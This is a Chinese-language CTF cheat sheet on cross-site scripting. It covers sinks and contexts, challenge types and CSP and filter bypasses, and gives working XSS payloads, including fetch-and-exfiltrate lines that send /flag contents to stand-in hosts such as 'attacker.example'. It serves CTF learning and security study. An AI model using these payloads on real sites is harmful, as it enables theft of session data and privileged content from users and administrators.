# XSS

## 原理
XSS 的关键在于攻击者可控数据进入浏览器解释器，并以脚本、事件、协议、模板表达式或 DOM gadget 的形式被执行。它不只是 `<script>alert(1)</script>` 这么简单，而是一个“输入点 + 上下文 + sink”三元问题：输入点决定污染源；上下文决定如何逃逸；sink 决定最终能否执行。常见 sink 包括 `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write`、`eval`、`setTimeout(string)`、`srcdoc`、`location` 拼接、模板引擎未转义输出等。对 CTF 题来说，真正有价值的是识别“哪种上下文成立”：HTML 文本、HTML 属性、URL 属性、JS 字符串、模板语法、Markdown 渲染、富文本白名单、前端路由、`postMessage` 数据流，每种上下文的 payload 设计完全不同。

按存储位置，XSS 可分为反射型、存储型和 DOM 型。反射型多见于搜索、错误提示、跳转页、预览页；存储型多见于评论、资料、聊天、工单、后台配置；DOM 型则是前端自己把污染数据送入危险 sink，常见来源是 `location.search`、`location.hash`、`document.referrer`、`postMessage`、`localStorage` 与服务端返回的 JSON 片段。CTF 常加上 CSP、长度限制、标签白名单、实体编码、富文本清洗器、bot 访问器等条件，目标通常不是“弹窗”，而是借管理员上下文读取 flag、发起同源请求、提取隐藏 DOM、窃取 token 或强制 bot 访问你的收集端。

## 工具与命令示例
```bash
# 1) 经典 HTML 上下文测试
python -c "print('<script>alert(1)</script>')"

# 2) 事件处理器型 payload，适合 script 标签被过滤的情况
python -c "print('<img src=x onerror=alert(document.domain)>')"

# 3) SVG onload，常用于富文本与白名单绕过探测
python -c "print('<svg onload=alert(1)>')"

# 4) 属性上下文逃逸，适合 value/title/data-* 等属性注入点
python -c "print('" autofocus onfocus=alert(1) x="')"

# 5) JavaScript 字符串逃逸，适用于 script 块内拼接
python -c "print("\';fetch(`/flag`).then(r=>r.text()).then(x=>location=`https://attacker/?d=${btoa(x)}`);//")"

# 6) 使用 dalfox 扫描反射型 XSS
./dalfox url "http://target/search?q=FUZZ" --skip-bav

# 7) 用 curl 直接验证反射点输出位置
curl "http://target/search?q=%3Csvg%20onload=alert(1)%3E"

# 8) Grep 前端源码中的危险 sink
rg -n "innerHTML|outerHTML|document.write|insertAdjacentHTML|eval\(|postMessage|srcdoc" .
```

## 常见 CTF 题型
### 题型一：管理员 bot 访问的存储型 XSS
思路：评论区、工单、留言板存储 payload，管理员 bot 带着高权限 Cookie 访问。目标通常是让 bot 发起同源请求读取 `/flag`、后台面板、仅管理员可见内容，再外带到你的接收端。

如果第一种最小 payload（例如 `<script>...</script>`）提交后，bot 访问 `/visit` 仍没有任何 sid/flag 外带，不要停在原地；直接切到第二种同上下文的最小事件型变体（如 `<img onerror=...>`、`<svg onload=...>`），并清楚记录 **first failed / second worked**。

```javascript
fetch('/admin/flag')
  .then(r => r.text())
  .then(x => location = 'https://attacker.example/collect?d=' + btoa(x))
```

### 题型二：反射型 XSS + 上下文逃逸
思路：页面把参数放进属性、脚本字符串或模板变量里，普通标签不执行。先观察原始输出，再针对上下文写最小逃逸 payload。若在属性值内，优先闭合引号并挂事件；若在脚本字符串内，闭合字符串并注释后续内容。

```python
# JS 字符串上下文
payload = "';alert(document.domain);//"
print(payload)

# 属性上下文
payload = '" onmouseover=alert(1) x="'
print(payload)
```

### 题型三：DOM XSS 依赖前端路由或 postMessage
思路：输入不进服务端模板，而是在前端代码中被 `innerHTML`、`srcdoc` 或模板插值直接使用。应优先读 JS、source map，沿着 source 到 sink 做数据流定位，而不是只盯请求响应。

```javascript
// 示例：页面执行了 content.innerHTML = location.hash.slice(1)
location.hash = '<img src=x onerror=fetch(`/flag`).then(r=>r.text()).then(alert)>'
```

### 题型四：CSP/白名单绕过
思路：当 `script-src` 很严时，不一定能直接跑任意 JS，此时转向现成 gadget：站内 JSONP、可控 callback、允许的第三方脚本、`iframe srcdoc`、SVG、Markdown 渲染链、Angular/Vue 模板注入等。

```html
<iframe srcdoc="<script>fetch('/flag').then(r=>r.text()).then(parent.postMessage)</script>"></iframe>
```

## 绕过与进阶技巧
- **标签过滤绕过**：`<script>` 被拦时，尝试 `img`、`svg`、`body`、`details`、`video`、`marquee` 等带事件的标签。
- **引号过滤绕过**：利用无引号属性、反引号模板字面量、实体编码、换行、制表符拆分属性。
- **关键字过滤绕过**：`alert` 可换成 `confirm`、`prompt`、`top['al'+'ert'](1)`；`script` 关键字被拦时走事件型执行。
- **编码绕过**：HTML entity、URL 编码、双重编码、UTF-7/罕见字符通常在现代题较少，但老题仍值得尝试。
- **富文本清洗器绕过**：关注允许标签中的危险属性，如 `href`, `src`, `xlink:href`, `style`, `formaction`, `srcdoc`。
- **CSP 下的实战思路**：优先找同源可用 gadget，而不是硬拼内联脚本；检查是否允许 `'unsafe-inline'`、nonce 泄露、JSONP、上传脚本、受信任 CDN 路径污染。
- **DOM 型提权**：很多题不是拿 Cookie，而是读 DOM 中隐藏 flag、调用同源管理接口、触发 CSRF 风格的状态修改。
- **Bot 环境差异**：确认 bot 是否能出网、是否执行 JS、是否带登录状态、是否禁用弹窗。对 bot 题，`fetch + location` 往往比 `alert(1)` 更接近得分。
- **最小 fallback**：首个 payload 没动静时，优先换“最小变体”而不是重写一整套利用链；例如从 `<script>` 切到 `img/svg` 事件型，同步保留同源外带目标与 `/visit -> sid -> /admin` 主链。
- **模板注入边界**：有些题表面像 XSS，实际是前端模板或 SSR 模板注入，遇到 `{{ }}`、`${ }`、`<%= %>` 这类表达式要警惕越界成更高危问题。

## 快速检查清单
- [ ] 输入点最终进入的是 HTML 文本、属性、URL、脚本字符串还是 DOM sink
- [ ] 是否存在 `innerHTML`、`document.write`、`eval`、`srcdoc`、`postMessage` 等危险 sink
- [ ] 页面是否存在长度限制、白名单、转义、实体编码或富文本清洗
- [ ] 是否有管理员 bot，bot 是否携带 Cookie 并执行脚本
- [ ] 是否能通过同源 `fetch()` 读取管理员可见内容或 `/flag`
- [ ] `<script>` 被过滤时，是否测试过事件型标签与 SVG
- [ ] 若有 CSP，是否分析了 nonce、受信任域、JSONP、站内 gadget
- [ ] DOM XSS 是否已沿 source-to-sink 追踪，而非只看服务端回显
- [ ] 外带通道是否可用，是否需要改成站内写入或同源回显
- [ ] 最终 payload 是否以“拿 flag/拿敏感内容”为目标，而不是只追求弹窗
